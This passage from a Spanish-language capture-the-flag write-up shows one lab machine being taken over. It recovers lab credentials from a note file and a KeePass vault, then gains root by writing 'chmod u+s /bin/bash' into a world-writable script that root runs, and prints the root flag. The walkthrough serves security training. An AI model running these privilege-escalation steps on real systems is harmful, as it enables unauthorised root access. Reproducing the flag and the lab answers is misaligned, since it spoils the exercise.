2024-08-21 14:58:51 (294 MB/s) - ‘alice.kdbx’ saved [1797/1797]
```

Una vez que ya lo tengamos en nuestro host cerramos el servidor de `python3` de la maquina victima.

Si intentamos utilziar la herramienta `keepass2john` veremos que no se puede, por lo que si intentamos abrir la base de datos de ese `keepass` nos pedira una contarseña, pero esa contarseña la encontraremos si nos vamos con el usuario `mario` a la siguiente ubicacion.

```shell
cd /var/www/alice_note
```

Y si listamos veremos un archivo llamado `note.txt` que si lo leemos pone lo siguiente.

```
flowerpower
```

Por lo que esa sera la contraseña del `keepass`.

## Escalate user alice

En nuestro host nos instalamos `keepassxc` para poder cargar la base de datos.

```shell
apt install keepassxc
```

Lo ejecutamos.

```shell
keepassxc
```

Y nos abrira un entorno grafico para seleccionar la base de datos, seleccionaremos el archivo `alice.kdbx` y nos pedira la contraseña, metemos `flowerpower` y nos desbloqueara la base de datos dentro de la misma encontramos una carpeta con las credenciales del usuario `alice`.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Por lo que vemos la contraseña de `alice` es `superalicepassword`, asi que cambiaremos de usuario haciendo lo siguiente.

```shell
su alice
```

Y metemos la contraseña obtenida, con esto ya seremos el usuario `alice`.

## Escalate Privileges

Si vemos los procesos haciendo el siguiente comando.

```shell
ps -aux
```

Info:

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1 28.9  0.0   2800  2048 ?        Ss   19:56  20:24 /bin/sh -c service ssh start && service apache2 start && service tomcat start && service mysql start && while true; d
root          15  0.0  0.0  12020  4104 ?        Ss   19:56   0:00 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          33  0.1  0.2 203852 22448 ?        Ss   19:56   0:07 /usr/sbin/apache2 -k start
www-data      38  0.0  0.2 204776 21580 ?        S    19:56   0:01 /usr/sbin/apache2 -k start
www-data      39  0.0  0.1 204644 17740 ?        S    19:56   0:01 /usr/sbin/apache2 -k start
www-data      40  0.0  0.1 204644 16972 ?        S    19:56   0:01 /usr/sbin/apache2 -k start
www-data      41  0.0  0.1 204652 17228 ?        S    19:56   0:01 /usr/sbin/apache2 -k start
www-data      42  0.0  0.1 204644 16972 ?        S    19:56   0:01 /usr/sbin/apache2 -k start
tomcat        59  1.3  2.8 7684132 281484 ?      Sl   19:56   0:58 /usr/bin/java -Djava.util.logging.config.file=/opt/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apa
mysql        108  0.0  0.0   2800  1792 ?        S    19:56   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        259  3.8  4.3 2674020 434528 ?      Sl   19:56   2:44 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --log-error=/var/log/mysq
www-data   17278  0.0  0.1 204644 17228 ?        S    19:57   0:02 /usr/sbin/apache2 -k start
www-data  523348  0.0  0.1 204636 16844 ?        S    20:12   0:00 /usr/sbin/apache2 -k start
root     1425438  0.0  0.0  14444  7592 ?        Ss   20:38   0:00 sshd: rosa [priv]
rosa     1431710  0.0  0.0  14852  6440 ?        S    20:38   0:00 sshd: rosa@pts/0
rosa     1431756  0.0  0.0   5016  3840 pts/0    Ss+  20:38   0:00 -bash
root     2007627  0.0  0.0  14444  7500 ?        Ss   20:55   0:00 sshd: mario [priv]
mario    2008261  0.2  0.0  14704  6440 ?        S    20:55   0:01 sshd: mario@pts/2
mario    2008307  0.0  0.0   5016  3968 pts/2    Ss   20:55   0:00 -bash
root     2367378  0.1  0.0   6744  4664 pts/2    S    21:06   0:00 su alice
alice    2367871  0.6  0.0   5016  3968 pts/2    S    21:06   0:00 bash
alice    2373823  0.0  0.0   9632  4864 pts/2    R+   21:07   0:00 ps -aux
```

Vemos que se esta ejecutando en blucle por `root` un archivo llamado `boss` en la carpeta `/opt/alice` y si vamos a esa direccion y vemos que permisos tiene ese archivo...

```shell
cd /opt/alice
ls -la boss
```

Info:

```
-rwxrwxrwx 1 root root 95 Aug 21 15:37 boss
```

Vemos que podemos escribir en el, por lo que haremos lo siguiente.

```shell
nano boss

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Lo guardamos y esperamos, si comprobamos que haya funcionado de la siguiente forma.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente.

```shell
bash -p
```

Y con esto seremos `root`, por lo que leeremos la flag.

> root.txt

```
c33b3d6c28dddad9fadd90b81fc57d24
```
